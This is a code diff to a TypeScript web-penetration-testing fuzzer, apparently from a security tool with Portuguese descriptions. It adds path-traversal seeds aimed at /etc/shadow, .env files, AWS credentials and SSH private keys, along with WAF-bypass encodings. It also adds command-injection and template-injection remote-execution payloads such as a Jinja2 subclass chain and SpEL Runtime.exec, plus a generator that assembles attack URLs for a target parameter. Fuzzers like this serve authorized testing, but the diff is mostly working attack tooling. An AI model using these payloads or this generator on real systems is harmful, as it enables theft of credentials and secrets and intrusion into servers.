@@ -2,6 +2,7 @@
  * Payload Fuzzer Engine
  * Comprehensive security mutation & fuzzing engine for manual and semi-automated web application penetration testing.
  * Covers SQLi, XSS, Path Traversal / LFI, OS Command Injection, SSTI, SSRF, and NoSQL/LDAP.
+ * Features dedicated URL Parameter Fuzzing with automated URL encoding & directory traversal bypasses.
  */
 
 export type FuzzCategory = 
@@ -20,6 +21,14 @@ export type MutationType =
   | 'url_encode'
   | 'double_url_encode'
   | 'all_char_url'
+  | 'traversal_dot_slash_url'     // ../ -> %2e%2e%2f
+  | 'traversal_slash_only_url'    // ../ -> ..%2f
+  | 'traversal_dot_only_url'      // ../ -> %2e%2e/
+  | 'traversal_double_encoded'    // ../ -> %252e%252e%252f
+  | 'traversal_non_recursive'     // ../ -> ....//
+  | 'traversal_utf8_overlong'     // ../ -> %c0%ae%c0%ae%c0%af
+  | 'traversal_16bit_unicode'     // ../ -> %u002e%u002e%u002f
+  | 'traversal_windows_backslash' // ..\ -> ..%5c or %2e%2e%5c
   | 'case_alternate'
   | 'whitespace_tamper'
   | 'null_byte'
@@ -57,6 +66,42 @@ export interface GeneratedFuzzItem {
   length: number;
   severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
   description: string;
+  parameterName?: string;
+  rawPayloadOnly?: string;
+  encodingApplied?: string;
+}
+
+export interface ParsedUrlParam {
+  name: string;
+  value: string;
+}
+
+export interface ParsedUrlDetails {
+  rawUrl: string;
+  protocol: string;
+  host: string;
+  pathname: string;
+  params: ParsedUrlParam[];
+  hash: string;
+  isValidUrl: boolean;
+}
+
+export interface DirectoryTraversalOption {
+  id: string;
+  name: string;
+  pattern: string; // e.g., '%2e%2e%2f'
+  description: string;
+  badge: string;
+  category: 'standard' | 'encoded' | 'waf_bypass' | 'unicode';
+}
+
+export interface CommonTargetFile {
+  id: string;
+  name: string;
+  path: string;
+  os: 'Linux' | 'Windows' | 'Cloud/App' | 'Wrapper';
+  description: string;
+  severity: 'CRITICAL' | 'HIGH';
 }
 
 export const FUZZ_CATEGORIES: Array<{
@@ -293,6 +338,69 @@ export const DEFAULT_FUZZ_SEEDS: FuzzSeed[] = [
     targetContext: 'Linux OS file reading',
     severity: 'CRITICAL'
   },
+  {
+    id: 'lfi-6',
+    category: 'PATH_TRAVERSAL',
+    name: 'Linux Shadow Passwords File',
+    payload: '../../../../../../etc/shadow',
+    description: 'Tentativa de extração de hashes de senhas dos usuários locais no Linux.',
+    targetContext: 'Privileged file read endpoints',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-7',
+    category: 'PATH_TRAVERSAL',
+    name: 'Null-Byte Extension Bypass (%00.png)',
+    payload: '../../../../../../etc/passwd%00.png',
+    description: 'Bypass de validação de sufixo ou extensão fixa com caractere nulo.',
+    targetContext: 'File preview endpoints with static extension',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-8',
+    category: 'PATH_TRAVERSAL',
+    name: 'Pre-Encoded Slash Traversal (..%2f)',
+    payload: '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
+    description: 'Codificação de barras (/ -> %2f) para evasão de regex de caminho.',
+    targetContext: 'URL query parameter file loader',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-9',
+    category: 'PATH_TRAVERSAL',
+    name: 'Full URL-Encoded Traversal (%2e%2e%2f)',
+    payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+    description: 'Codificação completa de pontos e barras para burlar detecções estáticas de WAF.',
+    targetContext: 'WAF-protected file parameter',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-10',
+    category: 'PATH_TRAVERSAL',
+    name: 'Application Environment Secrets (.env)',
+    payload: '../../../../../../.env',
+    description: 'Extração direta de credenciais de aplicação web, tokens de API e conexões de banco de dados.',
+    targetContext: 'Web application root directory',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-11',
+    category: 'PATH_TRAVERSAL',
+    name: 'AWS CLI Credentials Leak',
+    payload: '../../../../../../root/.aws/credentials',
+    description: 'Leitura de credenciais permanentes do AWS CLI no diretório do usuário root.',
+    targetContext: 'Cloud-hosted EC2/container services',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'lfi-12',
+    category: 'PATH_TRAVERSAL',
+    name: 'Absolute Root Path Read',
+    payload: '/etc/passwd',
+    description: 'Caminho absoluto direto sem necessidade de recursão relativa.',
+    targetContext: 'Direct path concatenation',
+    severity: 'CRITICAL'
+  },
 
   // --- OS Command Injection ---
   {
@@ -318,65 +426,74 @@ export const DEFAULT_FUZZ_SEEDS: FuzzSeed[] = [
     category: 'COMMAND_INJECTION',
     name: 'Subshell Execution $(id)',
     payload: '$(id)',
-    description: 'Interpolação de subshell POSIX para execução de comandos dentro de argumentos.',
+    description: 'Injeção de subshell POSIX para execução assíncrona do binário id.',
     targetContext: 'Quoted command parameter',
     severity: 'CRITICAL'
   },
   {
     id: 'cmd-4',
     category: 'COMMAND_INJECTION',
-    name: 'Backtick Execution `id`',
-    payload: '`id`',
-    description: 'Execução legada de comandos via crases em interpretadores Unix.',
-    targetContext: 'String parameter passed to shell',
+    name: 'Double Ampersand AND (&& id)',
+    payload: '&& id',
+    description: 'Execução condicional em caso de sucesso do comando anterior.',
+    targetContext: 'Shell argument input',
     severity: 'CRITICAL'
   },
   {
     id: 'cmd-5',
     category: 'COMMAND_INJECTION',
-    name: 'Whitespace Bypass with IFS ($IFS$9id)',
-    payload: ';cat$IFS$9/etc/passwd;',
-    description: 'Bypass de filtros de espaço usando a variável interna Internal Field Separator.',
-    targetContext: 'Space-restricted shell parameter',
+    name: 'Backtick Shell Execution `whoami`',
+    payload: '`whoami`',
+    description: 'Execução inline clássica em Bourne Shell e shells compatíveis.',
+    targetContext: 'String interpolation parameter',
     severity: 'CRITICAL'
+  },
+  {
+    id: 'cmd-6',
+    category: 'COMMAND_INJECTION',
+    name: 'Newline Inject (%0a id)',
+    payload: '\nid\n',
+    description: 'Quebra de linha CRLF para iniciar novo comando em ambientes sem escape de quebras.',
+    targetContext: 'Single line CLI script',
+    severity: 'HIGH'
   },
 
   // --- SSTI ---
   {
     id: 'ssti-1',
     category: 'SSTI',
-    name: 'Jinja2 / Twig Math Probe {{7*7}}',
+    name: 'Polyglot Mathematical Expression {{7*7}}',
     payload: '{{7*7}}',
-    description: 'Expressão de teste universal; se retornar "49", indica template engine ativo.',
-    targetContext: 'Email template / User nickname',
+    description: 'Expressão básica para detecção de avaliação dinâmica (renderiza 49 se vulnerável).',
+    targetContext: 'Template engine placeholder',
     severity: 'HIGH'
   },
   {
     id: 'ssti-2',
     category: 'SSTI',
-    name: 'Spring / FreeMarker Variable ${7*7}',
-    payload: '${7*7}',
-    description: 'Sintaxe baseada em dólar e chaves comum em Java Spring Expression Language.',
-    targetContext: 'Java web apps / JSP templates',
-    severity: 'HIGH'
+    name: 'Jinja2 / Flask Subclasses RCE Probe',
+    payload: "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    description: 'Navegação pela hierarquia de classes em Python/Jinja2 para alcançar os.popen.',
+    targetContext: 'Flask / Django Jinja2 template',
+    severity: 'CRITICAL'
   },
   {
     id: 'ssti-3',
     category: 'SSTI',
-    name: 'Ruby ERB Syntax <%= 7*7 %>',
-    payload: '<%= 7*7 %>',
-    description: 'Tags de interpolação em Ruby on Rails Embedded Ruby.',
-    targetContext: 'Ruby template engines',
-    severity: 'HIGH'
+    name: 'Spring Expression Language (SpEL)',
+    payload: '${T(java.lang.Runtime).getRuntime().exec("id")}',
+    description: 'Injeção de expressões SpEL em aplicações Java / Spring Boot.',
+    targetContext: 'Spring Boot REST header or param',
+    severity: 'CRITICAL'
   },
   {
     id: 'ssti-4',
     category: 'SSTI',
-    name: 'Jinja2 Python Config Exfiltration',
-    payload: '{{config.items()}}',
-    description: 'Leitura do dicionário de configurações e segredos do Flask/Jinja2.',
-    targetContext: 'Flask / Python Jinja2',
-    severity: 'CRITICAL'
+    name: 'Twig / Symfony Expression {{7*"7"}}',
+    payload: '{{7*"7"}}',
+    description: 'Avaliação matemática específica do Twig (PHP) para diferenciação de Jinja2.',
+    targetContext: 'PHP Twig template parser',
+    severity: 'HIGH'
   },
 
   // --- SSRF ---
@@ -467,50 +584,106 @@ export const DEFAULT_MUTATION_OPTIONS: MutationOption[] = [
   {
     id: 'url_encode',
     name: 'URL Encode (Single)',
-    description: 'Converte caracteres especiais em %XX (ex: espaço -> %20, aspas -> %27).',
+    description: 'Converte caracteres especiais em %XX (espaço -> %20, aspas -> %27, barras -> %2F).',
     enabled: true,
-    badge: '%20 / %27'
+    badge: '%20'
   },
   {
     id: 'double_url_encode',
     name: 'Double URL Encode',
-    description: 'Aplica codificação de URL duas vezes consecutivas para contornar proxies e WAFs.',
+    description: 'Codifica a porcentagem duas vezes (% -> %2520) para bypass de reverse proxies e CDNs.',
     enabled: true,
     badge: '%2520'
   },
   {
     id: 'all_char_url',
-    name: 'All-Chars URL Encode',
-    description: 'Codifica 100% dos caracteres, inclusive alfanuméricos normais em formato %hex.',
+    name: 'Full Hex URL Encode',
+    description: 'Converte 100% dos caracteres para percent-encoding hexadecimal (inclusive letras e números).',
     enabled: false,
     badge: '%41%42%43'
   },
   {
-    id: 'case_alternate',
-    name: 'Case Alternation (Tamper)',
-    description: 'Alterna maiúsculas e minúsculas (ex: sElEcT, uNiOn, sCrIpT) contra assinaturas regex.',
+    id: 'traversal_dot_slash_url',
+    name: 'Traversal Dot-Slash (%2e%2e%2f)',
+    description: 'Codifica ../ para %2e%2e%2f e ..\\ para %2e%2e%5c (evasão clássica de inspeção de WAF).',
     enabled: true,
+    badge: '%2e%2e%2f'
+  },
+  {
+    id: 'traversal_slash_only_url',
+    name: 'Traversal Slash-Only (..%2f)',
+    description: 'Codifica apenas as barras (/ -> %2f e \\ -> %5c) mantendo pontos literais.',
+    enabled: true,
+    badge: '..%2f'
+  },
+  {
+    id: 'traversal_dot_only_url',
+    name: 'Traversal Dot-Only (%2e%2e/)',
+    description: 'Codifica apenas os pontos (. -> %2e) mantendo barras literais.',
+    enabled: false,
+    badge: '%2e%2e/'
+  },
+  {
+    id: 'traversal_double_encoded',
+    name: 'Traversal Double URL (%252e%252e%252f)',
+    description: 'Codificação dupla para servidores com múltiplos saltos de decodificação reversa.',
+    enabled: true,
+    badge: '%252e%252e%252f'
+  },
+  {
+    id: 'traversal_non_recursive',
+    name: 'Non-Recursive Strip (....//)',
+    description: 'Evasão contra funções de sanitização que realizam replace("../", "") em passagem única.',
+    enabled: true,
+    badge: '....//'
+  },
+  {
+    id: 'traversal_utf8_overlong',
+    name: 'Overlong UTF-8 (%c0%ae%c0%ae%c0%af)',
+    description: 'Bytes fora do padrão UTF-8 que decodificam para ../ em parsers legados.',
+    enabled: false,
+    badge: '%c0%ae...'
+  },
+  {
+    id: 'traversal_16bit_unicode',
+    name: '16-bit Unicode (%u002e%u002e%u002f)',
+    description: 'Codificação Unicode de 16 bits para servidores IIS / ASP.NET.',
+    enabled: false,
+    badge: '%u002e...'
+  },
+  {
+    id: 'traversal_windows_backslash',
+    name: 'Windows Backslash (..\\ / ..%5c)',
+    description: 'Converte barras normais para barras invertidas do Windows.',
+    enabled: false,
+    badge: '..%5c'
+  },
+  {
+    id: 'case_alternate',
+    name: 'Case Alternation (aLtErNaTe)',
+    description: 'Alterna entre maiúsculas e minúsculas para burlar regras de regex sensíveis à caixa.',
+    enabled: false,
     badge: 'sElEcT'
   },
   {
     id: 'whitespace_tamper',
-    name: 'Whitespace Tampering',
-    description: 'Substitui espaços comuns por comentários SQL (/**/) ou quebras de linha (%0a).',
-    enabled: true,
+    name: 'Whitespace Tamper (/**/)',
+    description: 'Substitui espaços por comentários SQL inline (/**/) ou quebras de linha URL (%0a).',
+    enabled: false,
     badge: '/**/ & %0a'
   },
   {
     id: 'null_byte',
-    name: 'Null Byte Injection',
+    name: 'Null Byte Injection (%00)',
     description: 'Anexa %00 ou \\x00 para testar terminação antecipada de strings e bypass de extensão.',
-    enabled: false,
+    enabled: true,
     badge: '%00'
   },
   {
     id: 'quote_tamper',
     name: 'Quote & Bracket Wrap',
     description: 'Envolve e escapa o payload com aspas simples, duplas e parênteses para quebrar sintaxe.',
-    enabled: true,
+    enabled: false,
     badge: `'\'' / ")"`
   },
   {
@@ -526,6 +699,212 @@ export const DEFAULT_MUTATION_OPTIONS: MutationOption[] = [
     description: 'Converte caracteres em entidades decimais e hexadecimais (&lt;, &#x27;).',
     enabled: false,
     badge: '&#x27;'
+  }
+];
+
+export const DIRECTORY_TRAVERSAL_ENCODINGS: DirectoryTraversalOption[] = [
+  {
+    id: 'raw',
+    name: 'Raw Standard (../)',
+    pattern: '../',
+    description: 'Sequência canônica de subida de diretório em sistemas UNIX e navegadores.',
+    badge: '../',
+    category: 'standard'
+  },
+  {
+    id: 'full_url',
+    name: 'Full URL Encoded (%2e%2e%2f)',
+    pattern: '%2e%2e%2f',
+    description: 'Codificação completa dos pontos (. = %2e) e barra (/ = %2f) para evasão de inspeção estática.',
+    badge: '%2e%2e%2f',
+    category: 'encoded'
+  },
+  {
+    id: 'slash_only',
+    name: 'Slash Only Encoded (..%2f)',
+    pattern: '..%2f',
+    description: 'Codifica apenas a barra inclinada. Evasão comum contra filtros que barram "../" literal.',
+    badge: '..%2f',
+    category: 'encoded'
+  },
+  {
+    id: 'dot_only',
+    name: 'Dot Only Encoded (%2e%2e/)',
+    pattern: '%2e%2e/',
+    description: 'Codifica apenas os pontos (. = %2e) mantendo a barra visível para o roteador.',
+    badge: '%2e%2e/',
+    category: 'encoded'
+  },
+  {
+    id: 'double_url',
+    name: 'Double URL Encoded (%252e%252e%252f)',
+    pattern: '%252e%252e%252f',
+    description: 'Codificação dupla para servidores com múltiplos saltos de decodificação reversa.',
+    badge: '%252e%252e%252f',
+    category: 'waf_bypass'
+  },
+  {
+    id: 'non_recursive',
+    name: 'Non-Recursive Strip (....//)',
+    pattern: '....//',
+    description: 'Quando o filtro de segurança executa replace("../", "") uma única vez, resulta em "../" novamente.',
+    badge: '....//',
+    category: 'waf_bypass'
+  },
+  {
+    id: 'nested_dot_slash',
+    name: 'Nested Dot-Slash (..././)',
+    pattern: '..././',
+    description: 'Variante de evasão contra parsers com normalização rasa de caminhos.',
+    badge: '..././',
+    category: 'waf_bypass'
+  },
+  {
+    id: 'windows_backslash',
+    name: 'Windows Backslash (..\\)',
+    pattern: '..\\',
+    description: 'Separador nativo do sistema operacional Windows (DOS / NTFS).',
+    badge: '..\\',
+    category: 'standard'
+  },
+  {
+    id: 'windows_backslash_url',
+    name: 'Windows Backslash URL (..%5c)',
+    pattern: '..%5c',
+    description: 'Barra invertida do Windows codificada (%5c = \\) contra filtros de URL.',
+    badge: '..%5c',
+    category: 'encoded'
+  },
+  {
+    id: 'windows_full_url',
+    name: 'Windows Full URL (%2e%2e%5c)',
+    pattern: '%2e%2e%5c',
+    description: 'Pontos e barra invertida Windows totalmente codificados em URL.',
+    badge: '%2e%2e%5c',
+    category: 'encoded'
+  },
+  {
+    id: 'utf8_overlong',
+    name: 'Overlong UTF-8 (%c0%ae%c0%ae%c0%af)',
+    pattern: '%c0%ae%c0%ae%c0%af',
+    description: 'Bytes UTF-8 fora do padrão que decodificam para "../" em parsers vulneráveis do IIS / Apache antigo.',
+    badge: '%c0%ae...',
+    category: 'unicode'
+  },
+  {
+    id: '16bit_unicode',
+    name: '16-bit Unicode (%u002e%u002e%u002f)',
+    pattern: '%u002e%u002e%u002f',
+    description: 'Codificação Unicode de 16 bits aceita pelo Microsoft IIS e frameworks legadas.',
+    badge: '%u002e...',
+    category: 'unicode'
+  }
+];
+
+export const COMMON_TARGET_FILES: CommonTargetFile[] = [
+  {
+    id: 'linux-passwd',
+    name: 'Linux /etc/passwd',
+    path: 'etc/passwd',
+    os: 'Linux',
+    description: 'Contas locais, shells e estrutura de usuários do sistema UNIX.',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'linux-shadow',
+    name: 'Linux /etc/shadow',
+    path: 'etc/shadow',
+    os: 'Linux',
+    description: 'Hashes de senhas do sistema Linux (exige privilégios elevados de leitura).',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'linux-environ',
+    name: 'Linux /proc/self/environ',
+    path: 'proc/self/environ',
+    os: 'Linux',
+    description: 'Variáveis de ambiente do processo atual, chaves de API, senhas e DB strings.',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'linux-cmdline',
+    name: 'Linux /proc/self/cmdline',
+    path: 'proc/self/cmdline',
+    os: 'Linux',
+    description: 'Argumentos e parâmetros passados na inicialização do serviço.',
+    severity: 'HIGH'
+  },
+  {
+    id: 'linux-hosts',
+    name: 'Linux /etc/hosts',
+    path: 'etc/hosts',
+    os: 'Linux',
+    description: 'Resoluções de host locais e infraestrutura interna.',
+    severity: 'HIGH'
+  },
+  {
+    id: 'linux-apache-log',
+    name: 'Apache Log /var/log/apache2/access.log',
+    path: 'var/log/apache2/access.log',
+    os: 'Linux',
+    description: 'Log de acessos do Apache (útil para LFI-to-RCE via log poisoning).',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'win-ini',
+    name: 'Windows win.ini',
+    path: 'windows/win.ini',
+    os: 'Windows',
+    description: 'Arquivo de inicialização clássico presente em instalações Windows.',
+    severity: 'HIGH'
+  },
+  {
+    id: 'win-hosts',
+    name: 'Windows hosts file',
+    path: 'windows/system32/drivers/etc/hosts',
+    os: 'Windows',
+    description: 'Mapeamento DNS local do Windows.',
+    severity: 'HIGH'
+  },
+  {
+    id: 'win-boot-ini',
+    name: 'Windows boot.ini',
+    path: 'boot.ini',
+    os: 'Windows',
+    description: 'Configuração de boot em servidores legados Windows.',
+    severity: 'HIGH'
+  },
+  {
+    id: 'app-env',
+    name: 'App .env Environment Secrets',
+    path: '.env',
+    os: 'Cloud/App',
+    description: 'Segredos da aplicação web, JWT_SECRET, AWS_KEY, DATABASE_URL.',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'aws-creds',
+    name: 'AWS Credentials (~/.aws/credentials)',
+    path: 'root/.aws/credentials',
+    os: 'Cloud/App',
+    description: 'Chaves de acesso permanente do AWS CLI da conta root ou de serviço.',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'ssh-key',
+    name: 'SSH Private Key (id_rsa)',
+    path: 'root/.ssh/id_rsa',
+    os: 'Cloud/App',
+    description: 'Chave RSA privada para conexão SSH ao servidor.',
+    severity: 'CRITICAL'
+  },
+  {
+    id: 'php-filter',
+    name: 'PHP Filter Base64 Wrapper',
+    path: 'php://filter/convert.base64-encode/resource=index.php',
+    os: 'Wrapper',
+    description: 'Exfiltração de código PHP codificado em Base64 sem executá-lo.',
+    severity: 'CRITICAL'
   }
 ];
 
@@ -549,6 +928,47 @@ export function applyMutation(payload: string, mutationType: MutationType): stri
         .map(char => '%' + char.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase())
         .join('');
 
+    case 'traversal_dot_slash_url':
+      return payload
+        .replace(/\.\.\//g, '%2e%2e%2f')
+        .replace(/\.\.\\/g, '%2e%2e%5c');
+
+    case 'traversal_slash_only_url':
+      return payload
+        .replace(/\//g, '%2f')
+        .replace(/\\/g, '%5c');
+
+    case 'traversal_dot_only_url':
+      return payload.replace(/\./g, '%2e');
+
+    case 'traversal_double_encoded':
+      return payload
+        .replace(/\.\.\//g, '%252e%252e%252f')
+        .replace(/\.\.\\/g, '%252e%252e%255c')
+        .replace(/\//g, '%252f');
+
+    case 'traversal_non_recursive':
+      return payload
+        .replace(/\.\.\//g, '....//')
+        .replace(/\.\.\\/g, '....\\\\');
+
+    case 'traversal_utf8_overlong':
+      return payload
+        .replace(/\.\.\//g, '%c0%ae%c0%ae%c0%af')
+        .replace(/\//g, '%c0%af')
+        .replace(/\\/g, '%c1%9c');
+
+    case 'traversal_16bit_unicode':
+      return payload
+        .replace(/\.\.\//g, '%u002e%u002e%u002f')
+        .replace(/\//g, '%u002f')
+        .replace(/\\/g, '%u005c');
+
+    case 'traversal_windows_backslash':
+      return payload
+        .replace(/\//g, '\\')
+        .replace(/\.\.\//g, '..\\');
+
     case 'case_alternate':
       return payload
         .split('')
@@ -556,7 +976,6 @@ export function applyMutation(payload: string, mutationType: MutationType): stri
         .join('');
 
     case 'whitespace_tamper':
-      // If contains space, substitute with SQL comment /**/
       if (payload.includes(' ')) {
         return payload.replace(/ /g, '/**/');
       }
@@ -591,6 +1010,108 @@ export function applyMutation(payload: string, mutationType: MutationType): stri
 }
 
 /**
+ * URL Parameter Parsing and Reconstruction Helpers
+ */
+export function parseUrlParameters(urlString: string): ParsedUrlDetails {
+  const trimmed = urlString.trim();
+  if (!trimmed) {
+    return {
+      rawUrl: '',
+      protocol: '',
+      host: '',
+      pathname: '',
+      params: [],
+      hash: '',
+      isValidUrl: false
+    };
+  }
+
+  try {
+    const hasScheme = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(trimmed);
+    const parseable = hasScheme ? trimmed : `http://${trimmed}`;
+    const parsed = new URL(parseable);
+
+    const params: ParsedUrlParam[] = [];
+    parsed.searchParams.forEach((value, name) => {
+      params.push({ name, value });
+    });
+
+    return {
+      rawUrl: trimmed,
+      protocol: hasScheme ? parsed.protocol.replace(':', '') : '',
+      host: parsed.host,
+      pathname: parsed.pathname,
+      params,
+      hash: parsed.hash,
+      isValidUrl: true
+    };
+  } catch {
+    const [pathAndQuery, hashPart = ''] = trimmed.split('#');
+    const [pathPart, queryPart = ''] = pathAndQuery.split('?');
+    const params: ParsedUrlParam[] = [];
+
+    if (queryPart) {
+      queryPart.split('&').forEach(pair => {
+        if (!pair) return;
+        const [k, ...v] = pair.split('=');
+        params.push({ 
+          name: decodeURIComponent(k || ''), 
+          value: decodeURIComponent(v.join('=') || '') 
+        });
+      });
+    }
+
+    return {
+      rawUrl: trimmed,
+      protocol: '',
+      host: '',
+      pathname: pathPart || '',
+      params,
+      hash: hashPart ? `#${hashPart}` : '',
+      isValidUrl: params.length > 0 || trimmed.includes('/')
+    };
+  }
+}
+
+export function reconstructUrlWithParam(
+  baseParsed: ParsedUrlDetails,
+  targetParamName: string,
+  fuzzedValue: string
+): string {
+  if (!baseParsed.rawUrl) return fuzzedValue;
+
+  const [pathAndQuery, hashPart = ''] = baseParsed.rawUrl.split('#');
+  const [baseUrlPath, queryPart = ''] = pathAndQuery.split('?');
+  const hashSuffix = hashPart ? `#${hashPart}` : '';
+
+  if (!targetParamName) {
+    return `${baseUrlPath}?fuzz=${fuzzedValue}${hashSuffix}`;
+  }
+
+  if (!queryPart) {
+    return `${baseUrlPath}?${encodeURIComponent(targetParamName)}=${fuzzedValue}${hashSuffix}`;
+  }
+
+  let paramReplaced = false;
+  const queryPairs = queryPart.split('&').map(pair => {
+    if (!pair) return '';
+    const [k, ...v] = pair.split('=');
+    const decodedKey = decodeURIComponent(k || '');
+    if (decodedKey === targetParamName) {
+      paramReplaced = true;
+      return `${k}=${fuzzedValue}`;
+    }
+    return pair;
+  }).filter(Boolean);
+
+  if (!paramReplaced) {
+    queryPairs.push(`${encodeURIComponent(targetParamName)}=${fuzzedValue}`);
+  }
+
+  return `${baseUrlPath}?${queryPairs.join('&')}${hashSuffix}`;
+}
+
+/**
  * Injects a mutated payload into the base string according to placement mode
  */
 export function injectPayloadIntoBase(
@@ -607,13 +1128,10 @@ export function injectPayloadIntoBase(
     return base.replace(foundMarker, mutatedPayload);
   }
 
-  // If user selected MARKER but no marker exists in base, default to smart placement:
   if (mode === 'MARKER' && !foundMarker) {
-    // If base looks like a URL query param (ends with '='), append directly
     if (base.endsWith('=')) {
       return base + mutatedPayload;
     }
-    // If base has query params, append to last one or add &fuzz=
     if (base.includes('?')) {
       return base + mutatedPayload;
     }
@@ -668,7 +1186,153 @@ export function generateFuzzItems(
         fuzzedString: finalFuzzedString,
         length: finalFuzzedString.length,
         severity: seed.severity,
-        description: seed.description
+        description: seed.description,
+        rawPayloadOnly: mutatedPayload
+      });
+    });
+  });
+
+  return items;
+}
+
+/**
+ * Dedicated generator for URL Query Parameter Fuzzing
+ * Handles automatic URL encoding and directory traversal character bypasses
+ */
+export interface UrlParamFuzzConfig {
+  targetUrl: string;
+  selectedParam: string;
+  traversalDepths: number[]; // e.g. [3, 6, 8, 12]
+  selectedTraversalEncodings: string[]; // ids from DIRECTORY_TRAVERSAL_ENCODINGS
+  selectedTargetFiles: string[]; // ids from COMMON_TARGET_FILES
+  includeNullByteSuffix: boolean;
+  nullByteExtension: string; // e.g., '%00', '%00.png', '%00.jpg', '%2500.pdf'
+  autoUrlEncodeCommonPayloads: boolean;
+  selectedCategories: Set<FuzzCategory>;
+  selectedMutations: Set<MutationType>;
+  customSeeds: FuzzSeed[];
+}
+
+export function generateUrlParamFuzzItems(config: UrlParamFuzzConfig): GeneratedFuzzItem[] {
+  const {
+    targetUrl,
+    selectedParam,
+    traversalDepths,
+    selectedTraversalEncodings,
+    selectedTargetFiles,
+    includeNullByteSuffix,
+    nullByteExtension,
+    autoUrlEncodeCommonPayloads,
+    selectedCategories,
+    selectedMutations,
+    customSeeds
+  } = config;
+
+  const parsedUrl = parseUrlParameters(targetUrl);
+  const items: GeneratedFuzzItem[] = [];
+
+  // 1. Specialized Directory Traversal Matrix (if PATH_TRAVERSAL is selected)
+  if (selectedCategories.has('PATH_TRAVERSAL')) {
+    const encodingsToUse = DIRECTORY_TRAVERSAL_ENCODINGS.filter(e => 
+      selectedTraversalEncodings.includes(e.id)
+    );
+    const filesToUse = COMMON_TARGET_FILES.filter(f => 
+      selectedTargetFiles.includes(f.id)
+    );
+
+    encodingsToUse.forEach(enc => {
+      traversalDepths.forEach(depth => {
+        filesToUse.forEach(targetFile => {
+          const depthSequence = enc.pattern.repeat(depth);
+          const rawPayload = `${depthSequence}${targetFile.path}`;
+          const assembledUrl = reconstructUrlWithParam(parsedUrl, selectedParam, rawPayload);
+
+          items.push({
+            id: `trav-${enc.id}-${depth}-${targetFile.id}-${Math.random().toString(36).slice(2, 6)}`,
+            category: 'PATH_TRAVERSAL',
+            categoryLabel: 'Traversal',
+            techniqueName: `Traversal ${depth}x (${enc.badge}) -> ${targetFile.path}`,
+            originalSeed: targetFile.path,
+            mutationType: 'traversal_dot_slash_url',
+            mutationLabel: enc.name,
+            fuzzedString: assembledUrl,
+            length: assembledUrl.length,
+            severity: targetFile.severity,
+            description: `${enc.description} Alvo: ${targetFile.description}`,
+            parameterName: selectedParam,
+            rawPayloadOnly: rawPayload,
+            encodingApplied: enc.name
+          });
+
+          // Optional Null-Byte / Suffix Bypass
+          if (includeNullByteSuffix) {
+            const suffix = nullByteExtension || '%00';
+            const suffixPayload = `${rawPayload}${suffix}`;
+            const suffixUrl = reconstructUrlWithParam(parsedUrl, selectedParam, suffixPayload);
+
+            items.push({
+              id: `trav-null-${enc.id}-${depth}-${targetFile.id}-${Math.random().toString(36).slice(2, 6)}`,
+              category: 'PATH_TRAVERSAL',
+              categoryLabel: 'Traversal',
+              techniqueName: `Null-Byte Suffix (${enc.badge} + ${suffix}) -> ${targetFile.path}`,
+              originalSeed: targetFile.path,
+              mutationType: 'null_byte',
+              mutationLabel: `Null Byte Bypass (${suffix})`,
+              fuzzedString: suffixUrl,
+              length: suffixUrl.length,
+              severity: 'CRITICAL',
+              description: `Bypass de extensão ou terminação de string com caractere nulo (${suffix}) para ${targetFile.name}.`,
+              parameterName: selectedParam,
+              rawPayloadOnly: suffixPayload,
+              encodingApplied: `${enc.name} + Null Byte (${suffix})`
+            });
+          }
+        });
+      });
+    });
+  }
+
+  // 2. Standard Category Seeds with Automatic URL Encoding for URL parameters
+  const allSeeds = [...DEFAULT_FUZZ_SEEDS, ...customSeeds];
+  const activeSeeds = allSeeds.filter(s => {
+    // If PATH_TRAVERSAL, only include seeds that are not pure repetitive traversal (e.g. PHP wrappers, absolute paths)
+    if (s.category === 'PATH_TRAVERSAL') {
+      return s.id === 'lfi-4' || s.id === 'lfi-12' || s.id.startsWith('custom-');
+    }
+    return selectedCategories.has(s.category);
+  });
+
+  const activeMutationList = DEFAULT_MUTATION_OPTIONS.filter(m => selectedMutations.has(m.id));
+
+  activeSeeds.forEach(seed => {
+    activeMutationList.forEach(mutation => {
+      let mutatedPayload = applyMutation(seed.payload, mutation.id);
+
+      // Automatic URL Encoding for common payloads when targeting URL query parameters
+      let appliedLabel = mutation.name;
+      if (autoUrlEncodeCommonPayloads && mutation.id === 'raw') {
+        mutatedPayload = encodeURIComponent(seed.payload);
+        appliedLabel = 'Auto URL Encoded';
+      }
+
+      const assembledUrl = reconstructUrlWithParam(parsedUrl, selectedParam, mutatedPayload);
+      const categoryMeta = FUZZ_CATEGORIES.find(c => c.id === seed.category);
+
+      items.push({
+        id: `url-param-${seed.id}-${mutation.id}-${Math.random().toString(36).slice(2, 6)}`,
+        category: seed.category,
+        categoryLabel: categoryMeta?.shortLabel || seed.category,
+        techniqueName: seed.name,
+        originalSeed: seed.payload,
+        mutationType: mutation.id,
+        mutationLabel: appliedLabel,
+        fuzzedString: assembledUrl,
+        length: assembledUrl.length,
+        severity: seed.severity,
+        description: seed.description,
+        parameterName: selectedParam,
+        rawPayloadOnly: mutatedPayload,
+        encodingApplied: appliedLabel
       });
     });
   });
